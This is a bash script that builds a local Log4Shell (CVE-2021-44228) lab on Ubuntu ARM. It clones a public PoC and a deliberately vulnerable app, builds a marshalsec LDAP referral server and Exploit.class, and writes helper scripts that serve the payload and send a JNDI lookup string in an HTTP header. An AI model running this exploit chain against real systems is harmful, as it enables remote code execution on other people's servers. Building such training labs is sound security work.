#!/usr/bin/env bash
set -euo pipefail

if [[ "$EUID" -ne 0 ]]; then
  echo "[-] Please run this script as root, e.g.: sudo $0" >&2
  exit 1
fi

echo "[*] Updating /etc/apt/sources.list for Ubuntu ARM (ports.ubuntu.com)..."
tee /etc/apt/sources.list >/dev/null <<'EOF'
deb https://ports.ubuntu.com/ubuntu-ports noble main restricted universe multiverse
deb https://ports.ubuntu.com/ubuntu-ports noble-updates main restricted universe multiverse
deb https://ports.ubuntu.com/ubuntu-ports noble-backports main restricted universe multiverse
deb https://ports.ubuntu.com/ubuntu-ports noble-security main restricted universe multiverse
EOF

echo "[*] Running apt-get update..."
apt-get update -y

echo "[*] Installing base packages (Java 11, Maven, Python, Docker, etc.)..."
apt-get install -y \
  ca-certificates \
  curl \
  git \
  docker.io \
  openjdk-11-jdk \
  maven \
  python3 \
  python3-pip

echo "[*] Enabling and starting Docker (optional, for other labs)..."
systemctl enable --now docker || true

echo "[*] Creating lab user 'log4shell' (if needed)..."
if ! id -u log4shell >/dev/null 2>&1; then
  useradd -m -s /bin/bash log4shell
fi

echo "[*] Adding 'log4shell' to docker group..."
usermod -aG docker log4shell || true

echo "[*] Preparing base directory /opt/log4shell..."
mkdir -p /opt/log4shell
chown -R log4shell:log4shell /opt/log4shell

echo "[*] Switching into lab user 'log4shell' to finish setup..."
su - log4shell <<'EOSU'
set -euo pipefail

LAB_DIR="/opt/log4shell"
cd "$LAB_DIR"

########################################
# Clone PoC repos
########################################

echo "[*] Cloning PoC repository marcourbano/CVE-2021-44228 (if needed)..."
if [ ! -d "$LAB_DIR/CVE-2021-44228" ]; then
  git clone https://github.com/marcourbano/CVE-2021-44228.git
else
  echo "[=] CVE-2021-44228 already present."
fi

echo "[*] Cloning vulnerable app christophetd/log4shell-vulnerable-app (if needed)..."
if [ ! -d "$LAB_DIR/log4shell-vulnerable-app" ]; then
  git clone https://github.com/christophetd/log4shell-vulnerable-app.git
else
  echo "[=] log4shell-vulnerable-app already present."
fi

########################################
# Build LDAP server and Exploit.class
########################################

echo "[*] Building LDAP server with Maven..."
cd "$LAB_DIR/CVE-2021-44228/ldap_server"
mvn -q clean package -DskipTests

echo "[*] Compiling Exploit.java -> Exploit.class..."
cd "$LAB_DIR/CVE-2021-44228/exploit"
javac Exploit.java

########################################
# Build vulnerable app JAR (native, ARM-safe)
########################################

echo "[*] Building vulnerable app JAR with Gradle..."
cd "$LAB_DIR/log4shell-vulnerable-app"
chmod +x gradlew
./gradlew clean build

########################################
# Helper scripts
########################################

echo "[*] Creating helper scripts in $LAB_DIR ..."

# 1) HTTP server: serves Exploit.class on port 8000
cat > "$LAB_DIR/run-http-server.sh" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

PAYLOAD_DIR="/opt/log4shell/CVE-2021-44228/exploit"
LOG_DIR="/opt/log4shell/logs"
mkdir -p "$LOG_DIR"

cd "$PAYLOAD_DIR"

if pgrep -f "python3 -m http.server 8000" >/dev/null 2>&1; then
  echo "[=] HTTP server already running on :8000"
  exit 0
fi

echo "[*] Starting Python HTTP server on :8000 serving $PAYLOAD_DIR ..."
nohup python3 -m http.server 8000 >"$LOG_DIR/http-server.log" 2>&1 &

echo "[*] Logs: $LOG_DIR/http-server.log"
EOF

# 2) LDAP server: Marshalsec LDAPRefServer on 1389 pointing to http://127.0.0.1:8000/#Exploit
cat > "$LAB_DIR/run-ldap-server.sh" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

LAB_DIR="/opt/log4shell"
LDAP_DIR="$LAB_DIR/CVE-2021-44228/ldap_server"
LOG_DIR="$LAB_DIR/logs"
mkdir -p "$LOG_DIR"

JAR="$(ls "$LDAP_DIR"/target/ldap_server-*-all.jar 2>/dev/null | head -n1)"

if [ -z "$JAR" ]; then
  echo "[-] ldap_server JAR not found in $LDAP_DIR/target. Build it first (run setup script again)." >&2
  exit 1
fi

if ss -tulpn 2>/dev/null | grep -q ':1389 '; then
  echo "[=] Something already listening on port 1389."
  exit 0
fi

HTTP_HOST="127.0.0.1"
HTTP_PORT="8000"

echo "[*] Starting LDAP server on :1389 (redirects to http://${HTTP_HOST}:${HTTP_PORT}/#Exploit) ..."
nohup java -cp "$JAR" marshalsec.jndi.LDAPRefServer "http://${HTTP_HOST}:${HTTP_PORT}/#Exploit" >"$LOG_DIR/ldap-server.log" 2>&1 &

echo "[*] Logs: $LOG_DIR/ldap-server.log"
EOF

# 3) Vulnerable app (native Java on :8080; NO Docker, so ARM-safe)
cat > "$LAB_DIR/run-vulnerable-app.sh" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

APP_DIR="/opt/log4shell/log4shell-vulnerable-app"
LOG_FILE="/opt/log4shell/vulnerable-app-native.log"

if pgrep -f "log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar" >/dev/null 2>&1; then
  echo "[=] Vulnerable app already running."
  exit 0
fi

cd "$APP_DIR"

if ! ls build/libs/log4shell-vulnerable-app-*-SNAPSHOT.jar >/dev/null 2>&1; then
  echo "[*] Building vulnerable app JAR..."
  chmod +x gradlew
  ./gradlew clean build
fi

JAR="$(ls build/libs/log4shell-vulnerable-app-*-SNAPSHOT.jar | grep -v plain | head -n1)"

if [ -z "$JAR" ]; then
  echo "[-] Could not find built JAR in build/libs/" >&2
  exit 1
fi

echo "[*] Using JAR: $JAR"
echo "[*] Starting vulnerable app on port 8080 ..."
nohup java -jar "$JAR" >"$LOG_FILE" 2>&1 &

echo "[*] Logs: $LOG_FILE"
EOF

# 4) Trigger script: sends request with JNDI payload in X-Api-Version header
#    Payload itself comes from $JNDI_PAYLOAD so you can copy it from PoC README / article.
cat > "$LAB_DIR/trigger-exploit.sh" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

TARGET_URL="${1:-http://127.0.0.1:8080/}"

if [ -z "${JNDI_PAYLOAD:-}" ]; then
  cat <<'EOM'
[!] Environment variable JNDI_PAYLOAD is not set.

Set it using the pattern documented in:
  - /opt/log4shell/CVE-2021-44228/README.md   (curl example)
  - InfoSec Writeups "Exploiting Log4Shell — How Log4J Applications Were Hacked"

Example (from the PoC README – adjust IP for YOUR lab only):
  export JNDI_PAYLOAD='${jndi:ldap://<ldap_server_ip>:1389/a}'

Then run:
  JNDI_PAYLOAD="$JNDI_PAYLOAD" /opt/log4shell/trigger-exploit.sh

This keeps the actual payload under your control for lab use only.
EOM
  exit 1
fi

echo "[*] Sending Log4Shell test payload to $TARGET_URL ..."
curl -s "$TARGET_URL" -H "X-Api-Version: $JNDI_PAYLOAD"
echo
EOF

chmod +x "$LAB_DIR/"*.sh

echo
echo "[*] Setup complete."

echo
echo "Next steps (as user 'log4shell'):"
echo "  1) Start HTTP server:    /opt/log4shell/run-http-server.sh"
echo "  2) Start LDAP server:    /opt/log4shell/run-ldap-server.sh"
echo "  3) Start vulnerable app: /opt/log4shell/run-vulnerable-app.sh"
echo "  4) Set JNDI payload from PoC README, then:"
echo "         JNDI_PAYLOAD=\"...\" /opt/log4shell/trigger-exploit.sh"
echo
EOSU
